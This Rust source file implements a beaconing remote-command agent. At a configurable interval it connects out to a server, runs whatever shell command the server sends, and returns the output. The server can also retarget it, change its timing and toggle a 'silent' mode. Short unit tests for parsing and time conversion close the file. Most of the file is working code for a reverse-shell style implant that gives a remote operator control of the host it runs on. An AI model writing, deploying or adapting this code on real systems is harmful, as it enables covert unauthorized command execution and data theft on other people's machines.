use std::io::Write;
use std::net::TcpStream;
use std::process::Command;
use std::{io, thread, time};

pub fn run(config: &mut Config) {
    loop {
        thread::sleep(config.request_period.to_duration());
        let full_address = config.server.full_address();

        println!("Connecting to server at {}", &full_address);
        let stream =
            TcpStream::connect_timeout(&full_address, time::Duration::from_millis(config.timeout));

        match stream {
            Ok(stream) => {
                println!("Connected to server at {}", full_address);
                let _ = handle_stream(stream, config);
            }
            Err(_) => {
                println!("Failed to connect to server at {}", full_address);
                continue;
            }
        }
    }
}

fn handle_stream(mut stream: TcpStream, config: &mut Config) -> Result<(), io::Error> {
    let instruction = parse_stream(&stream);

    match instruction.execute(config) {
        Ok(output) => {
            output.send_feedback(&mut stream)?;
        }
        Err(_err) => {
            //Error while executing instruction
        }
    }
    Ok(())
}

fn parse_stream(stream: &TcpStream) -> Executable {
    let mut buffer = [0; 1024];
    stream
        .peek(&mut buffer)
        .expect("Failed to read from stream");

    let input = String::from_utf8_lossy(&buffer[..]);
    let input = input.trim_matches(char::from(0));
    println!("Received instruction: {}", input);

    instruction_factory(input)
}

struct InstructionOutput {
    output: String,
}
impl InstructionOutput {
    fn send_feedback(&self, stream: &mut TcpStream) -> Result<(), io::Error> {
        stream.write(&self.output.as_bytes())?;
        Ok(())
    }
}

enum Executable {
    Command(ReceivedCommand),
    Setting(ReceivedSetting),
}

impl Executable {
    fn execute(&self, config: &mut Config) -> Result<InstructionOutput, io::Error> {
        match self {
            Executable::Command(command) => command.execute(),
            Executable::Setting(setting) => setting.apply(config),
        }
    }
}

struct ReceivedCommand {
    command: String,
}

impl ReceivedCommand {
    fn from_string(command: String) -> Self {
        ReceivedCommand { command }
    }
    fn parse(&self) -> Command {
        let mut cmd;
        let mut parts = self.command.split_whitespace();

        match parts.next() {
            Some(part) => {
                cmd = Command::new(part);
            }
            None => {
                return Command::new("");
            }
        }

        loop {
            match parts.next() {
                Some(part) => {
                    cmd.arg(part);
                }
                None => break,
            }
        }

        cmd
    }

    pub fn execute(&self) -> Result<InstructionOutput, std::io::Error> {
        let mut command = self.parse();
        let output = &command.output();

        match output {
            Ok(output) => Ok(InstructionOutput {
                output: format!(
                    "\n{}\n{}\n",
                    String::from_utf8_lossy(&output.stdout),
                    String::from_utf8_lossy(&output.stderr)
                ),
            }),
            Err(err) => Ok(InstructionOutput {
                output: format!("{}\n", err),
            }),
        }
    }
}

struct ReceivedSetting {
    key: String,
    value: String,
}

impl ReceivedSetting {
    pub fn from_string(key: String, value: String) -> Self {
        ReceivedSetting { key, value }
    }

    fn parse_period(&self) -> Result<Period, std::io::Error> {
        let parts: Vec<&str> = self.value.split_whitespace().collect();
        let value = match parts[0].parse::<u64>() {
            Ok(value) => value,
            Err(_) => {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "Invalid period value",
                ))
            }
        };
        let unit = match parts[1] {
            "ms" => TimeUnit::Milliseconds,
            "s" => TimeUnit::Seconds,
            "m" => TimeUnit::Minutes,
            "h" => TimeUnit::Hours,
            "d" => TimeUnit::Days,
            _ => TimeUnit::Seconds,
        };

        Ok(Period::new(value, unit))
    }

    fn parse_server_info(&self) -> Result<ServerInfo, std::io::Error> {
        let parts: Vec<&str> = self.value.split_whitespace().collect();
        let address = parts[0];
        let port = match parts[1].parse::<u16>() {
            Ok(port) => port,
            Err(_) => {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "Invalid port value",
                ))
            }
        };
        Ok(ServerInfo::new(address, port))
    }

    fn parse_timeout(&self) -> Result<u64, std::io::Error> {
        match self.value.parse::<u64>() {
            Ok(value) => Ok(value),
            Err(_) => Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Invalid timeout value",
            )),
        }
    }

    fn parse_silent_mode(&self) -> Result<bool, std::io::Error> {
        match self.value.as_str() {
            "true" => Ok(true),
            "false" => Ok(false),
            _ => Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Invalid silent mode value",
            )),
        }
    }

    pub fn apply_setting(&self, config: &mut Config) -> Result<(), std::io::Error> {
        match self.key.as_str() {
            "period" => {
                config.set_period(self.parse_period()?);
            }
            "server" => {
                config.set_server_info(self.parse_server_info()?);
            }
            "timeout" => {
                config.set_timeout(self.parse_timeout()?);
            }
            "silent" => {
                config.set_silent_mode(self.parse_silent_mode()?);
            }
            _ => {}
        }
        Ok(())
    }

    pub fn apply(&self, config: &mut Config) -> Result<InstructionOutput, std::io::Error> {
        match self.apply_setting(config) {
            Ok(_) => Ok(InstructionOutput {
                output: format!("Setting {} to {}\n", self.key, self.value),
            }),
            Err(_) => Err(std::io::Error::new(
                io::ErrorKind::InvalidInput,
                format!("failed to apply setting {} to {}", self.key, self.value),
            )),
        }
    }
}

fn instruction_factory(instruction: &str) -> Executable {
    let parts: Vec<&str> = instruction.split_whitespace().collect();
    match parts[0] {
        "cmd" => Executable::Command(ReceivedCommand::from_string(parts[1..].join(" "))),
        "set" => Executable::Setting(ReceivedSetting::from_string(
            parts[1].to_string(),
            parts[2..].join(" ").to_string(),
        )),
        _ => Executable::Command(ReceivedCommand::from_string("".to_string())),
    }
}

pub enum TimeUnit {
    Milliseconds,
    Seconds,
    Minutes,
    Hours,
    Days,
}

pub struct Period {
    value: u64,
    unit: TimeUnit,
}

impl Period {
    pub fn new(value: u64, unit: TimeUnit) -> Self {
        Period { value, unit }
    }
    fn to_duration(&self) -> time::Duration {
        match self.unit {
            TimeUnit::Milliseconds => time::Duration::from_millis(self.value),
            TimeUnit::Seconds => time::Duration::from_secs(self.value),
            TimeUnit::Minutes => time::Duration::from_secs(self.value * 60),
            TimeUnit::Hours => time::Duration::from_secs(self.value * 60 * 60),
            TimeUnit::Days => time::Duration::from_secs(self.value * 60 * 60 * 24),
        }
    }
}

pub struct ServerInfo {
    address: String,
    port: u16,
}
impl ServerInfo {
    pub fn new(address: &str, port: u16) -> Self {
        ServerInfo {
            address: address.to_string(),
            port,
        }
    }

    fn full_address(&self) -> std::net::SocketAddr {
        let ip: std::net::IpAddr = self.address.parse().unwrap();
        std::net::SocketAddr::new(ip, self.port)
    }
}

pub struct Config {
    server: ServerInfo,
    timeout: u64,
    request_period: Period,
    silent_mode: bool,
}

impl Config {
    pub fn new(
        server: ServerInfo,
        timeout: u64,
        request_period: Period,
        silent_mode: bool,
    ) -> Self {
        Config {
            server,
            timeout,
            request_period,
            silent_mode,
        }
    }

    pub fn set_period(&mut self, period: Period) {
        self.request_period = period;
    }

    pub fn set_server_info(&mut self, server: ServerInfo) {
        self.server = server;
    }

    pub fn set_timeout(&mut self, timeout: u64) {
        self.timeout = timeout;
    }

    pub fn set_silent_mode(&mut self, silent_mode: bool) {
        self.silent_mode = silent_mode;
    }

}

#[cfg(test)]
mod tests {
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};

    use super::*;

    #[test]
    fn test_parse_command_with_just_command() {
        let command = ReceivedCommand::from_string("ls".to_string());
        let result = command.parse();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_one_arg() {
        let command = ReceivedCommand::from_string("ls -l".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_one_dash() {
        let command = ReceivedCommand::from_string("ls -la".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-la"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_multiple_dashes() {
        let command = ReceivedCommand::from_string("ls -l -a".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }

    #[test]
    fn test_parse_command_with_empty_command() {
        let command = ReceivedCommand::from_string("".to_string());
        let result = command.parse();

        assert_eq!(result.get_program(), "");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_whitespace_command() {
        let command = ReceivedCommand::from_string("   ls      -l      -a     ".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }

    #[test]
    fn test_period_to_duration_seconds() {
        let period = Period::new(1, TimeUnit::Seconds);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 1);
    }
    #[test]
    fn test_period_to_duration_minutes() {
        let period = Period::new(1, TimeUnit::Minutes);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 60);
    }

    #[test]
    fn test_period_to_duration_hours() {
        let period = Period::new(1, TimeUnit::Hours);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 60 * 60);
    }

    #[test]
    fn test_period_to_duration_days() {
        let period = Period::new(1, TimeUnit::Days);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 60 * 60 * 24);
    }

    #[test]
    fn test_server_info_full_address() {
        let server = ServerInfo::new("127.0.0.1", 8080);
        let full_address = server.full_address();

        assert_eq!(
            full_address,
            SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 8080)
        );
    }
}
